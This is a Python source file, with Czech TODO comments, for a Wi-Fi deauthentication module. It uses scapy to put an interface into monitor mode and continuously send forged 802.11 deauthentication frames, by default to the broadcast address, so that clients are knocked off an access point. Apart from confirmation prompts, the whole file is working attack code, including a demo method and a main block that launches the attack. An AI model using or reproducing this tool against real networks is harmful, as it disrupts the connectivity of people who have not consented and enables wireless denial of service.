from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp
from core.monitor_mode import MonitorMode
import time
from core.mac_vendors import get_vendor

# TODO:
# - přidat bezpečnostní potvrzení
# - přidat audit log
# - přidat časový limit
# - přidat ochranu proti omylu - jak proti omylu? tady není místo na omyl XD


class DeauthModule:
    def __init__(self):
        self.target_mac = "ff:ff:ff:ff:ff:ff"
        self.ap_mac = None
        self.interface = None
        self.state = "STOPPED"

    def select_target(self, target_mac="ff:ff:ff:ff:ff:ff", ap_mac="AA:BB:CC:DD:EE:FF", interface="wlan0"):
        self.target_mac = target_mac
        self.ap_mac = ap_mac
        self.interface = interface

        if not self.target_mac or not self.ap_mac or len(self.target_mac) != 17 or len(self.ap_mac) != 17:
                                    print("Invalid MAC address format. Please provide valid MAC addresses.")
                                    return False
        self.monitor = MonitorMode(interface=self.interface)

        if self.target_mac == "ff:ff:ff:ff:ff:ff":
            print("Warning: You are about to perform a deauthentication attack on all clients (broadcast).")
            print("This may cause disruption to multiple devices. Proceed with caution.")
            security_mac = input("Are you sure you want to continue? (Y/N): ")
            if security_mac != "Y" and security_mac != "y":
                print("Deauthentication attack aborted.")
                return False
        return True


        

    def start(self):
        if self.state == "RUNNING":
            print("Modul is already running.")
            return

        security = input(f"Are you sure you want to start the deauthentication attack on {self.target_mac}? (Y/N): ")
        if security == "Y" or security == "y":
            print(f"Starting deauthentication attack on {self.target_mac}...")
            self.monitor.enable()
            self.state = "RUNNING"
            try:
                while self.state == "RUNNING":
                    packet = (RadioTap() /
                            Dot11(type=0, subtype=12, addr1=self.target_mac, addr2=self.ap_mac, addr3=self.ap_mac) /
                            Dot11Deauth(reason=1)
                    )
                    sendp(packet, iface=self.interface, count=1, inter=0.1)
                    time.sleep(0.1)
            except KeyboardInterrupt:
                print("Deauthentication attack stopped by user.")
            except Exception:
                print("An error occurred during the deauthentication attack.")
            finally:
                self.stop()
        else:
            print("Deauthentication attack aborted.")
            self.state = "STOPPED"

    def stop(self):
        if self.state == "STOPPED":
            print("Modul is already stopped.")
            return
        self.state = "STOPPED"
        self.monitor.disable()

    def mac_lookup(self):
        ap_vendor = get_vendor(self.ap_mac)
        target_vendor = get_vendor(self.target_mac)
        
        print(f"AP MAC:     {self.ap_mac} ({ap_vendor})")
        print(f"Target MAC: {self.target_mac} ({target_vendor})")
        
    def start_demo(self):
        print("Starting demo deauthentication attack...")
        self.monitor.enable()
        self.state = "RUNNING"
        try:
            if self.state == "RUNNING":
                packet = (RadioTap() /
                        Dot11(type=0, subtype=12, addr1=self.target_mac, addr2=self.ap_mac, addr3=self.ap_mac) /
                        Dot11Deauth(reason=1)
                )
                sendp(packet, iface=self.interface, count=1, inter=0.1)
        except Exception:
            print("An error occurred during the demo deauthentication attack.")
        finally:
            print("Stopping demo deauthentication attack...")
            self.state = "STOPPED"
            self.monitor.disable()
            print("Demo deauthentication attack stopped.")

if __name__ == "__main__":
    deauth_module = DeauthModule()
    if deauth_module.select_target(target_mac="AA:BB:CC:DD:EE:FF", ap_mac="AA:BB:CC:DD:EE:FF", interface="wlan0"):
        deauth_module.start()
        deauth_module.mac_lookup()